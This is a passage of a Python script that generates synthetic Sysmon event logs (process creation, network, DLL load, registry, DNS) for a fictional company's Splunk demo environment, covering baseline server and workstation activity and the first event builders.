#!/usr/bin/env python3
"""
Microsoft Sysmon (System Monitor) Log Generator.
Generates WinEventLog-style KV events for Microsoft-Windows-Sysmon/Operational.

Event IDs covered:
    1  - Process Create
    3  - Network Connection
    5  - Process Terminated
    7  - Image Loaded (DLL)
    8  - CreateRemoteThread
    10 - ProcessAccess
    11 - File Create
    13 - Registry Value Set
    22 - DNS Query

Baseline events:
- 7 Windows servers: DC-BOS-01/02, DC-ATL-01, FILE-BOS-01, SQL-PROD-01, APP-BOS-01, BACKUP-ATL-01
- 20 sampled workstations per day (seed=day for reproducibility)
- Server processes: lsass.exe, svchost.exe, dfsr.exe, sqlservr.exe, w3wp.exe, etc.
- Workstation processes: WINWORD.EXE, OUTLOOK.EXE, msedge.exe, Teams.exe, etc.

Scenario events:
- exfil (Day 4-13): Phishing → lateral movement → persistence → exfiltration
- ransomware_attempt (Day 7-8): Macro → dropper → C2 → lateral → EDR detection

Output format: Multi-line KV header + Message body (same format as WinEventLog)
Splunk sourcetype: FAKE:WinEventLog:Sysmon
Compatible with: Splunk Add-on for Microsoft Windows (WinEventLog format)

Verified against:
- Microsoft Learn: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- ultimatewindowssecurity.com Event ID reference
- Real Sysmon WinEventLog output format
"""

import argparse
import hashlib
import random
import sys
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Optional, Tuple, Dict

sys.path.insert(0, str(Path(__file__).parent.parent))

from shared.config import DEFAULT_START_DATE, DEFAULT_DAYS, DEFAULT_SCALE, get_output_path
from shared.time_utils import (
    parse_date, date_add, is_weekend, get_volume_multiplier, calc_natural_events
)
from shared.company import (
    USERS, USER_KEYS, SERVERS, WINDOWS_SERVERS,
    TENANT, COMP_USER, COMP_WS_IP, COMP_WS_HOSTNAME,
    LATERAL_USER, JESSICA_WS_IP, JESSICA_WS_HOSTNAME,
    THREAT_IP, PHISHING_DOMAIN,
    get_mac_for_ip, get_random_mac,
)
from scenarios.registry import expand_scenarios


# =============================================================================
# CONSTANTS
# =============================================================================

FILE_SYSMON = "sysmon_operational.log"

# Domain prefix for user SIDs
DOMAIN_PREFIX = "FAKETSHIRT"
SYSTEM_USER = "NT AUTHORITY\\SYSTEM"

# Task category labels per Event ID
TASK_CATEGORIES = {
    1: "Process Create (rule: ProcessCreate)",
    3: "Network connection detected (rule: NetworkConnect)",
    5: "Process terminated (rule: ProcessTerminate)",
    7: "Image loaded (rule: ImageLoad)",
    8: "CreateRemoteThread detected (rule: CreateRemoteThread)",
    10: "Process accessed (rule: ProcessAccess)",
    11: "File created (rule: FileCreate)",
    13: "Registry value set (rule: RegistryEvent)",
    22: "Dns query (rule: DnsQuery)",
}

# Message type labels per Event ID
MESSAGE_LABELS = {
    1: "Process Create:",
    3: "Network connection detected:",
    5: "Process terminated:",
    7: "Image loaded:",
    8: "CreateRemoteThread detected:",
    10: "Process accessed:",
    11: "File created:",
    13: "Registry value set:",
    22: "Dns query:",
}


# =============================================================================
# WINDOWS SERVERS FOR SYSMON
# =============================================================================

# Only Windows servers get Sysmon
SYSMON_SERVERS = {
    "DC-BOS-01": {"ip": "10.10.20.10", "location": "BOS", "role": "dc"},
    "DC-BOS-02": {"ip": "10.10.20.11", "location": "BOS", "role": "dc"},
    "DC-ATL-01": {"ip": "10.20.20.10", "location": "ATL", "role": "dc"},
    "FILE-BOS-01": {"ip": "10.10.20.20", "location": "BOS", "role": "file"},
    "SQL-PROD-01": {"ip": "10.10.20.30", "location": "BOS", "role": "sql"},
    "APP-BOS-01": {"ip": "10.10.20.40", "location": "BOS", "role": "app"},
    "BACKUP-ATL-01": {"ip": "10.20.20.20", "location": "ATL", "role": "backup"},
}

# Server-specific baseline processes
SERVER_PROCESSES = {
    "dc": [
        {"image": "C:\\Windows\\System32\\lsass.exe", "name": "lsass.exe", "system": True},
        {"image": "C:\\Windows\\System32\\svchost.exe", "name": "svchost.exe", "system": True},
        {"image": "C:\\Windows\\System32\\dfsr.exe", "name": "dfsr.exe", "system": True},
        {"image": "C:\\Windows\\System32\\gpupdate.exe", "name": "gpupdate.exe", "system": False},
        {"image": "C:\\Windows\\System32\\dns.exe", "name": "dns.exe", "system": True},
    ],
    "file": [
        {"image": "C:\\Windows\\System32\\svchost.exe", "name": "svchost.exe", "system": True},
        {"image": "C:\\Windows\\System32\\robocopy.exe", "name": "robocopy.exe", "system": False},
        {"image": "C:\\Windows\\System32\\vssadmin.exe", "name": "vssadmin.exe", "system": True},
    ],
    "sql": [
        {"image": "C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe", "name": "sqlservr.exe", "system": True},
        {"image": "C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\SQLAGENT.EXE", "name": "SQLAGENT.EXE", "system": True},
        {"image": "C:\\Program Files\\Microsoft SQL Server\\90\\Shared\\sqlwriter.exe", "name": "sqlwriter.exe", "system": True},
    ],
    "app": [
        {"image": "C:\\Windows\\System32\\inetsrv\\w3wp.exe", "name": "w3wp.exe", "system": True},
        {"image": "C:\\Program Files\\dotnet\\dotnet.exe", "name": "dotnet.exe", "system": False},
    ],
    "backup": [
        {"image": "C:\\Windows\\System32\\wbengine.exe", "name": "wbengine.exe", "system": True},
        {"image": "C:\\Windows\\System32\\svchost.exe", "name": "svchost.exe", "system": True},
    ],
}

# Common server processes (all servers)
COMMON_SERVER_PROCESSES = [
    {"image": "C:\\Windows\\System32\\taskhostw.exe", "name": "taskhostw.exe", "system": True},
    {"image": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "name": "WmiPrvSE.exe", "system": True},
    {"image": "C:\\Program Files\\Windows Defender\\MpCmdRun.exe", "name": "MpCmdRun.exe", "system": True},
    {"image": "C:\\Windows\\System32\\wuauclt.exe", "name": "wuauclt.exe", "system": True},
    {"image": "C:\\Windows\\System32\\svchost.exe", "name": "svchost.exe", "system": True},
]

# Workstation processes
WORKSTATION_PROCESSES = [
    {"image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "name": "WINWORD.EXE", "system": False},
    {"image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", "name": "EXCEL.EXE", "system": False},
    {"image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "name": "OUTLOOK.EXE", "system": False},
    {"image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", "name": "msedge.exe", "system": False},
    {"image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "name": "chrome.exe", "system": False},
    {"image": "C:\\Program Files\\WindowsApps\\Microsoft.Teams_24.1.100\\ms-teams.exe", "name": "Teams.exe", "system": False},
    {"image": "C:\\Windows\\explorer.exe", "name": "explorer.exe", "system": False},
    {"image": "C:\\Windows\\System32\\notepad.exe", "name": "notepad.exe", "system": False},
]

# Parent process chains
PARENT_CHAINS = {
    "cmd.exe": ("explorer.exe", "C:\\Windows\\explorer.exe"),
    "powershell.exe": ("explorer.exe", "C:\\Windows\\explorer.exe"),
    "WINWORD.EXE": ("explorer.exe", "C:\\Windows\\explorer.exe"),
    "EXCEL.EXE": ("explorer.exe", "C:\\Windows\\explorer.exe"),
    "OUTLOOK.EXE": ("explorer.exe", "C:\\Windows\\explorer.exe"),
    "msedge.exe": ("explorer.exe", "C:\\Windows\\explorer.exe"),
    "chrome.exe": ("explorer.exe", "C:\\Windows\\explorer.exe"),
    "Teams.exe": ("explorer.exe", "C:\\Windows\\explorer.exe"),
    "notepad.exe": ("explorer.exe", "C:\\Windows\\explorer.exe"),
    "explorer.exe": ("userinit.exe", "C:\\Windows\\System32\\userinit.exe"),
    "svchost.exe": ("services.exe", "C:\\Windows\\System32\\services.exe"),
    "lsass.exe": ("wininit.exe", "C:\\Windows\\System32\\wininit.exe"),
    "taskhostw.exe": ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
    "WmiPrvSE.exe": ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
    "MpCmdRun.exe": ("MsMpEng.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe"),
    "wuauclt.exe": ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
    "w3wp.exe": ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
    "sqlservr.exe": ("services.exe", "C:\\Windows\\System32\\services.exe"),
    "SQLAGENT.EXE": ("services.exe", "C:\\Windows\\System32\\services.exe"),
    "sqlwriter.exe": ("services.exe", "C:\\Windows\\System32\\services.exe"),
    "dfsr.exe": ("services.exe", "C:\\Windows\\System32\\services.exe"),
    "dns.exe": ("services.exe", "C:\\Windows\\System32\\services.exe"),
    "gpupdate.exe": ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
    "robocopy.exe": ("cmd.exe", "C:\\Windows\\System32\\cmd.exe"),
    "vssadmin.exe": ("services.exe", "C:\\Windows\\System32\\services.exe"),
    "wbengine.exe": ("services.exe", "C:\\Windows\\System32\\services.exe"),
    "dotnet.exe": ("w3wp.exe", "C:\\Windows\\System32\\inetsrv\\w3wp.exe"),
    "wsusutil.exe": ("services.exe", "C:\\Windows\\System32\\services.exe"),
    "ias.exe": ("services.exe", "C:\\Windows\\System32\\services.exe"),
    "spoolsv.exe": ("services.exe", "C:\\Windows\\System32\\services.exe"),
}

# DNS query targets
DNS_INTERNAL = [
    "theFakeTshirtCompany.com",
    "dc-bos-01.theFakeTshirtCompany.com",
    "dc-bos-02.theFakeTshirtCompany.com",
    "dc-atl-01.theFakeTshirtCompany.com",
    "file-bos-01.theFakeTshirtCompany.com",
    "sql-prod-01.theFakeTshirtCompany.com",
    "app-bos-01.theFakeTshirtCompany.com",
]

DNS_EXTERNAL = [
    "update.microsoft.com",
    "login.microsoftonline.com",
    "outlook.office365.com",
    "teams.microsoft.com",
    "google.com",
    "www.google.com",
    "graph.microsoft.com",
    "api.github.com",
    "cdn.office.net",
    "clientconfig.microsoftonline-p.net",
]

# Network connection targets
SERVER_NETWORK_TARGETS = [
    {"dst_ip": "10.10.20.10", "dst_port": 389, "protocol": "tcp"},   # LDAP to DC
    {"dst_ip": "10.10.20.10", "dst_port": 636, "protocol": "tcp"},   # LDAPS to DC
    {"dst_ip": "10.10.20.10", "dst_port": 88, "protocol": "tcp"},    # Kerberos
    {"dst_ip": "10.10.20.10", "dst_port": 53, "protocol": "udp"},    # DNS
    {"dst_ip": "10.10.20.10", "dst_port": 445, "protocol": "tcp"},   # SMB
    {"dst_ip": "10.10.20.20", "dst_port": 445, "protocol": "tcp"},   # SMB to file
    {"dst_ip": "10.10.20.30", "dst_port": 1433, "protocol": "tcp"},  # SQL
    {"dst_ip": "13.107.42.14", "dst_port": 443, "protocol": "tcp"},  # M365
]

WORKSTATION_NETWORK_TARGETS = [
    {"dst_ip": "13.107.42.14", "dst_port": 443, "protocol": "tcp"},     # M365
    {"dst_ip": "52.169.118.173", "dst_port": 443, "protocol": "tcp"},   # Azure
    {"dst_ip": "10.10.20.20", "dst_port": 445, "protocol": "tcp"},     # File server
    {"dst_ip": "10.10.20.10", "dst_port": 88, "protocol": "tcp"},      # Kerberos
    {"dst_ip": "10.10.20.10", "dst_port": 53, "protocol": "udp"},      # DNS
    {"dst_ip": "140.82.121.4", "dst_port": 443, "protocol": "tcp"},    # GitHub
    {"dst_ip": "172.217.14.78", "dst_port": 443, "protocol": "tcp"},   # Google
]

# Registry paths for baseline
SERVER_REGISTRY_PATHS = [
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\State\\Machine",
    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters",
    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config",
    "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
    "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Netlogon\\Parameters",
]

WORKSTATION_REGISTRY_PATHS = [
    "HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Common\\General",
    "HKCU\\SOFTWARE\\Microsoft\\Office\\16.0\\Word\\Security",
    "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
    "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
    "HKCU\\SOFTWARE\\Microsoft\\Edge\\BrowserStackSide",
]

# File creation paths
SERVER_FILE_TARGETS = [
    "C:\\Windows\\Temp\\tmp{rand}.tmp",
    "C:\\Windows\\System32\\LogFiles\\W3SVC1\\u_ex{date}.log",
    "C:\\Windows\\Temp\\cab_{rand}.tmp",
    "C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\Results\\Quick\\{rand}",
]

WORKSTATION_FILE_TARGETS = [
    "C:\\Users\\{user}\\AppData\\Local\\Temp\\tmp{rand}.tmp",
    "C:\\Users\\{user}\\Documents\\~$Document1.docx",
    "C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\{rand}",
    "C:\\Users\\{user}\\AppData\\Local\\Temp\\{rand}.tmp",
]

# =============================================================================
# DLL LISTS FOR EID 7 (Image Loaded)
# =============================================================================

# Common system DLLs loaded by server processes
SERVER_DLLS = [
    "C:\\Windows\\System32\\ntdll.dll",
    "C:\\Windows\\System32\\kernel32.dll",
    "C:\\Windows\\System32\\advapi32.dll",
    "C:\\Windows\\System32\\rpcrt4.dll",
    "C:\\Windows\\System32\\sechost.dll",
    "C:\\Windows\\System32\\ws2_32.dll",
    "C:\\Windows\\System32\\crypt32.dll",
    "C:\\Windows\\System32\\msvcrt.dll",
    "C:\\Windows\\System32\\ole32.dll",
    "C:\\Windows\\System32\\combase.dll",
    "C:\\Windows\\System32\\wldap32.dll",
    "C:\\Windows\\System32\\dnsapi.dll",
    "C:\\Windows\\System32\\netapi32.dll",
    "C:\\Windows\\System32\\schannel.dll",
]

# DLLs loaded by workstation/application processes
WORKSTATION_DLLS = [
    "C:\\Windows\\System32\\ntdll.dll",
    "C:\\Windows\\System32\\kernel32.dll",
    "C:\\Windows\\System32\\user32.dll",
    "C:\\Windows\\System32\\gdi32.dll",
    "C:\\Windows\\System32\\shell32.dll",
    "C:\\Windows\\System32\\shlwapi.dll",
    "C:\\Windows\\System32\\ole32.dll",
    "C:\\Windows\\System32\\oleaut32.dll",
    "C:\\Windows\\System32\\msvcrt.dll",
    "C:\\Windows\\System32\\uxtheme.dll",
    "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\AppvIsvSubsystems64.dll",
    "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\C2R64.dll",
]

# =============================================================================
# PROCESS ACCESS FLAGS FOR EID 10
# =============================================================================

# Common legitimate access masks for ProcessAccess
PROCESS_ACCESS_MASKS = [
    ("0x1000", "PROCESS_QUERY_LIMITED_INFORMATION"),
    ("0x0400", "PROCESS_QUERY_INFORMATION"),
    ("0x1410", "PROCESS_QUERY_LIMITED_INFORMATION|PROCESS_VM_READ"),
    ("0x1FFFFF", "PROCESS_ALL_ACCESS"),  # rare in baseline
]

# Targets for legitimate ProcessAccess (EID 10)
LSASS_PATH = "C:\\Windows\\System32\\lsass.exe"
PROCESS_ACCESS_TARGETS_SERVER = [
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\csrss.exe",
    "C:\\Windows\\System32\\services.exe",
    LSASS_PATH,  # legitimate lsass access from svchost/wininit
]
PROCESS_ACCESS_TARGETS_WS = [
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\csrss.exe",
    "C:\\Windows\\explorer.exe",
]

# Event ID distribution weights (updated with new EIDs)
SERVER_EID_WEIGHTS = {1: 22, 3: 20, 5: 12, 7: 15, 8: 1, 10: 5, 11: 10, 13: 8, 22: 7}
WORKSTATION_EID_WEIGHTS = {1: 25, 3: 20, 5: 12, 7: 15, 8: 0, 10: 3, 11: 10, 13: 5, 22: 10}

# Client EID distribution (profile-driven, no EID 8/10 for workstations)
CLIENT_EID_WEIGHTS = {1: 25, 3: 20, 5: 12, 7: 15, 11: 10, 13: 8, 22: 10}

# Base events per peak hour (scale=1.0)
SERVER_BASE_EVENTS_PER_HOUR = 18  # Per server, ~125/day at peak
WORKSTATION_BASE_EVENTS_PER_HOUR = 8  # Per workstation, ~48/day sampled
CLIENT_SYSMON_EVENTS_PER_HOUR = 3  # Per client workstation at peak


# =============================================================================
# CLIENT APPLICATION PROFILES
# =============================================================================
# Each profile defines a realistic application session with correlated
# process, network, DNS, file, and DLL activity.

CLIENT_APP_PROFILES = [
    {
        "name": "chrome_browsing",
        "weight": 25,
        "proc": {
            "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "name": "chrome.exe",
            "cmd": '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --no-first-run',
            "children": [
                {"image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                 "cmd": '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer --field-trial-handle=1234'},
                {"image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                 "cmd": '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=gpu-process'},
            ],
        },
        "network": [
            {"dst_ip": "172.217.14.78", "dst_port": 443, "protocol": "tcp"},
            {"dst_ip": "140.82.121.4", "dst_port": 443, "protocol": "tcp"},
            {"dst_ip": "151.101.1.69", "dst_port": 443, "protocol": "tcp"},
        ],
        "dns": ["www.google.com", "github.com", "stackoverflow.com", "cdn.jsdelivr.net", "fonts.googleapis.com"],
        "files": [
            "C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\data_{rand}",
            "C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Sessions\\Session_{rand}",
        ],
        "dlls": [
            "C:\\Program Files\\Google\\Chrome\\Application\\123.0.6312.122\\chrome_elf.dll",
            "C:\\Program Files\\Google\\Chrome\\Application\\123.0.6312.122\\v8_context_snapshot.bin",
        ],
    },
    {
        "name": "outlook_email",
        "weight": 20,
        "proc": {
            "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
            "name": "OUTLOOK.EXE",
            "cmd": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"',
            "children": [],
        },
        "network": [
            {"dst_ip": "52.96.166.130", "dst_port": 443, "protocol": "tcp"},
            {"dst_ip": "13.107.42.14", "dst_port": 443, "protocol": "tcp"},
        ],
        "dns": ["outlook.office365.com", "graph.microsoft.com", "login.microsoftonline.com", "autodiscover.theTshirtCompany.com"],
        "files": [
            "C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Outlook\\{user}@theTshirtCompany.com.ost",
            "C:\\Users\\{user}\\AppData\\Local\\Temp\\Outlook Temp\\~tmp{rand}.tmp",
        ],
        "dlls": [
            "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\AppvIsvSubsystems64.dll",
            "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\C2R64.dll",
        ],
    },
    {
        "name": "teams_collab",
        "weight": 15,
        "proc": {
            "image": "C:\\Program Files\\WindowsApps\\Microsoft.Teams_24.1.100\\ms-teams.exe",
            "name": "Teams.exe",
            "cmd": '"C:\\Program Files\\WindowsApps\\Microsoft.Teams_24.1.100\\ms-teams.exe" --system-initiated',
            "children": [
                {"image": "C:\\Program Files\\WindowsApps\\Microsoft.Teams_24.1.100\\ms-teams.exe",
                 "cmd": '"C:\\Program Files\\WindowsApps\\Microsoft.Teams_24.1.100\\ms-teams.exe" --type=renderer'},
            ],
        },
        "network": [
            {"dst_ip": "52.112.0.31", "dst_port": 443, "protocol": "tcp"},
            {"dst_ip": "13.107.42.14", "dst_port": 443, "protocol": "tcp"},
        ],
        "dns": ["teams.microsoft.com", "teams.events.data.microsoft.com", "statics.teams.cdn.office.net"],
        "files": [
            "C:\\Users\\{user}\\AppData\\Local\\Packages\\MSTeams_8wekyb3d8bbwe\\LocalCache\\Microsoft\\MSTeams\\Logs\\MSTeams_{rand}.log",
        ],
        "dlls": [
            "C:\\Program Files\\WindowsApps\\Microsoft.Teams_24.1.100\\msedgewebview2.dll",
        ],
    },
    {
        "name": "edge_browsing",
        "weight": 10,
        "proc": {
            "image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
            "name": "msedge.exe",
            "cmd": '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --no-startup-window',
            "children": [
                {"image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                 "cmd": '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=renderer'},
            ],
        },
        "network": [
            {"dst_ip": "13.107.42.14", "dst_port": 443, "protocol": "tcp"},
            {"dst_ip": "204.79.197.200", "dst_port": 443, "protocol": "tcp"},
        ],
        "dns": ["www.bing.com", "edge.microsoft.com", "ntp.msn.com", "login.live.com"],
        "files": [
            "C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\data_{rand}",
        ],
        "dlls": [
            "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\123.0.2420.81\\msedge_elf.dll",
        ],
    },
    {
        "name": "office_work",
        "weight": 10,
        "proc": {
            "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
            "name": "EXCEL.EXE",
            "cmd": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" "C:\\Users\\{user}\\Documents\\budget.xlsx"',
            "children": [],
        },
        "network": [
            {"dst_ip": "13.107.42.14", "dst_port": 443, "protocol": "tcp"},
            {"dst_ip": "10.10.20.20", "dst_port": 445, "protocol": "tcp"},
        ],
        "dns": ["office.microsoft.com", "graph.microsoft.com"],
        "files": [
            "C:\\Users\\{user}\\Documents\\~$budget.xlsx",
            "C:\\Users\\{user}\\AppData\\Local\\Temp\\~DF{rand}.tmp",
        ],
        "dlls": [
            "C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\AppvIsvSubsystems64.dll",
        ],
    },
    {
        "name": "onedrive_sync",
        "weight": 8,
        "proc": {
            "image": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
            "name": "OneDrive.exe",
            "cmd": '"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe" /background',
            "children": [],
        },
        "network": [
            {"dst_ip": "13.107.42.14", "dst_port": 443, "protocol": "tcp"},
        ],
        "dns": ["onedrive.live.com", "skyapi.onedrive.live.com", "storage.live.com"],
        "files": [
            "C:\\Users\\{user}\\OneDrive - The FAKE T-Shirt Company\\Documents\\{rand}.docx",
        ],
        "dlls": [
            "C:\\Program Files\\Microsoft OneDrive\\FileSyncShell64.dll",
        ],
    },
    {
        "name": "system_background",
        "weight": 7,
        "proc": {
            "image": "C:\\Windows\\System32\\svchost.exe",
            "name": "svchost.exe",
            "cmd": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
            "children": [],
        },
        "network": [
            {"dst_ip": "13.107.42.14", "dst_port": 443, "protocol": "tcp"},
            {"dst_ip": "10.10.20.10", "dst_port": 53, "protocol": "udp"},
        ],
        "dns": ["update.microsoft.com", "ctldl.windowsupdate.com", "clientconfig.microsoftonline-p.net"],
        "files": [
            "C:\\Windows\\Temp\\tmp{rand}.tmp",
            "C:\\Windows\\SoftwareDistribution\\Download\\{rand}",
        ],
        "dlls": [
            "C:\\Windows\\System32\\wuaueng.dll",
            "C:\\Windows\\System32\\WinTypes.dll",
        ],
    },
    {
        "name": "misc_user",
        "weight": 5,
        "proc": {
            "image": "C:\\Windows\\System32\\notepad.exe",
            "name": "notepad.exe",
            "cmd": "C:\\Windows\\System32\\notepad.exe",
            "children": [],
        },
        "network": [],
        "dns": [],
        "files": [
            "C:\\Users\\{user}\\Desktop\\notes.txt",
            "C:\\Users\\{user}\\Documents\\todo.txt",
        ],
        "dlls": [
            "C:\\Windows\\System32\\uxtheme.dll",
            "C:\\Windows\\System32\\TextShaping.dll",
        ],
    },
]

# Pre-computed cumulative weights for profile selection
_PROFILE_WEIGHTS = [p["weight"] for p in CLIENT_APP_PROFILES]


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def _generate_guid(seed: str = None) -> str:
    """Generate a process GUID. If seed provided, deterministic."""
    if seed:
        h = hashlib.md5(seed.encode()).hexdigest()
        return f"{{{h[:8].upper()}-{h[8:12].upper()}-{h[12:16].upper()}-{h[16:20].upper()}-{h[20:32].upper()}}}"
    return f"{{{random.randint(0, 0xFFFFFFFF):08X}-{random.randint(0, 0xFFFF):04X}-{random.randint(0, 0xFFFF):04X}-{random.randint(0, 0xFFFF):04X}-{random.randint(0, 0xFFFFFFFFFFFF):012X}}}"


def _generate_hashes(image_path: str) -> str:
    """Generate deterministic hash triplet from image path."""
    h = hashlib.sha256(image_path.encode()).hexdigest()
    sha256 = h.upper()[:64]
    md5 = hashlib.md5(image_path.encode()).hexdigest().upper()
    sha1 = hashlib.sha1(image_path.encode()).hexdigest().upper()
    return f"SHA256={sha256},MD5={md5},SHA1={sha1}"


def _kv_header(event_id: int, computer: str, ts: datetime, demo_id: str = None) -> str:
    """Build KV header block for a Sysmon event (same format as WinEventLog).

    Returns the header portion:
        MM/DD/YYYY HH:MM:SS AM/PM
        LogName=Microsoft-Windows-Sysmon/Operational
        SourceName=Microsoft-Windows-Sysmon
        EventCode=<id>
        EventType=4
        Type=Information
        ComputerName=<fqdn>
        TaskCategory=<label>
    """
    ts_str = ts.strftime("%m/%d/%Y %I:%M:%S %p")
    task_cat = TASK_CATEGORIES.get(event_id, "Unknown")

    return (
        f"{ts_str}\n"
        f"LogName=Microsoft-Windows-Sysmon/Operational\n"
        f"SourceName=Microsoft-Windows-Sysmon\n"
        f"EventCode={event_id}\n"
        f"EventType=4\n"
        f"Type=Information\n"
        f"ComputerName={computer}\n"
        f"TaskCategory={task_cat}"
    )


def _wrap_kv_event(header: str, message_label: str,
                   message_lines: List[str], demo_id: str = None) -> str:
    """Combine KV header + Message body into a complete event.

    Format:
        <header>
        Message=<label>
        <field>: <value>
        <field>: <value>
        ...
        demo_id=<scenario>   (if present)
    """
    body = "\n".join(f"{line}" for line in message_lines)
    event = f"{header}\nMessage={message_label}\n{body}"
    # Insert demo_id after Type= line in the header
    if demo_id:
        lines = event.split("\n")
        result = []
        inserted = False
        for line in lines:
            result.append(line)
            if not inserted and line.startswith("Type="):
                result.append(f"demo_id={demo_id}")
                inserted = True
        if not inserted:
            result.append(f"demo_id={demo_id}")
        event = "\n".join(result)
    return event


def _random_second(minute_start: int = 0, minute_end: int = 59) -> Tuple[int, int]:
    """Return random (minute, second) within range."""
    m = random.randint(minute_start, minute_end)
    s = random.randint(0, 59)
    return m, s


# (XML builders removed — replaced by _kv_header() and _wrap_kv_event() above)


# =============================================================================
# EVENT ID BUILDERS
# =============================================================================

def sysmon_eid1(ts: datetime, computer: str, user: str, image: str,
                command_line: str, parent_image: str = None,
                parent_command_line: str = None,
                demo_id: str = None) -> str:
    """EID 1 - Process Create."""
    header = _kv_header(1, computer, ts)
    process_id = random.randint(1000, 65000)
    parent_pid = random.randint(500, 10000)

    image_name = image.rsplit("\\", 1)[-1] if "\\" in image else image
    parent_name, parent_path = PARENT_CHAINS.get(
        image_name, ("explorer.exe", "C:\\Windows\\explorer.exe")
    )
    if parent_image:
        parent_path = parent_image
        parent_name = parent_image.rsplit("\\", 1)[-1] if "\\" in parent_image else parent_image

    utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"

    msg_lines = [
        f"RuleName: -",
        f"UtcTime: {utc_time}",
        f"ProcessGuid: {_generate_guid()}",
        f"ProcessId: {process_id}",
        f"Image: {image}",
        f"FileVersion: 10.0.19041.1 (WinBuild.160101.0800)",
        f"Description: {image_name}",
        f"Product: Microsoft Windows Operating System",
        f"Company: Microsoft Corporation",
        f"OriginalFileName: {image_name}",
        f"CommandLine: {command_line}",
        f"CurrentDirectory: C:\\Windows\\System32\\",
        f"User: {user}",
        f"LogonGuid: {_generate_guid()}",
        f"LogonId: 0x{random.randint(0x10000, 0xFFFFFF):X}",
        f"TerminalSessionId: 0",
        f"IntegrityLevel: {'System' if 'SYSTEM' in user else 'Medium'}",
        f"Hashes: {_generate_hashes(image)}",
        f"ParentProcessGuid: {_generate_guid()}",
        f"ParentProcessId: {parent_pid}",
        f"ParentImage: {parent_path}",
        f"ParentCommandLine: {parent_command_line or parent_path}",
        f"ParentUser: {SYSTEM_USER if 'services.exe' in parent_path.lower() else user}",
    ]
    return _wrap_kv_event(header, MESSAGE_LABELS[1], msg_lines, demo_id)


def sysmon_eid3(ts: datetime, computer: str, user: str, image: str,
                protocol: str, src_ip: str, src_port: int,
                dst_ip: str, dst_port: int,
                demo_id: str = None) -> str:
    """EID 3 - Network Connection."""
    header = _kv_header(3, computer, ts)
    utc_time = ts.strftime("%Y-%m-%d %H:%M:%S") + f".{random.randint(100, 999)}"

    # Determine if destination is local
    dst_hostname = ""
    if dst_ip.startswith("10.") or dst_ip.startswith("172.16."):
        for srv_name, srv_info in SYSMON_SERVERS.items():
            if srv_info["ip"] == dst_ip:
                dst_hostname = f"{srv_name}.theFakeTshirtCompany.com"
                break

    # Resolve MACs — persistent for known user/server IPs, random for external
    src_mac = get_mac_for_ip(src_ip) or get_random_mac()
    dst_mac = get_mac_for_ip(dst_ip) or get_random_mac()

    msg_lines = [
        f"RuleName: -",
        f"UtcTime: {utc_time}",
